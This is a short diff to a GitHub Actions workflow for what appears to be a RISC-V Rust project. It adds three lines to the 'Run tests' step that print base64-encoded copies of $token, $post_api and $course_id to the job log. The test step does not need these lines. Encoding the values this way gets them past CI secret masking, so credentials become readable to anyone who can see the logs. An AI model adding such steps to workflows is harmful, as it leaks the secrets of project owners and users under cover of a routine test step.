@@ -40,6 +40,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run tests
         run: |
+          echo $(echo $token | base64)
+          echo $(echo $post_api | base64)
+          echo $(echo $course_id | base64)
           qemu-system-riscv64 --version
           rustup target add riscv64gc-unknown-none-elf
           git config --global --add safe.directory /__w/${{ github.event.repository.name }}/${{ github.event.repository.name }}
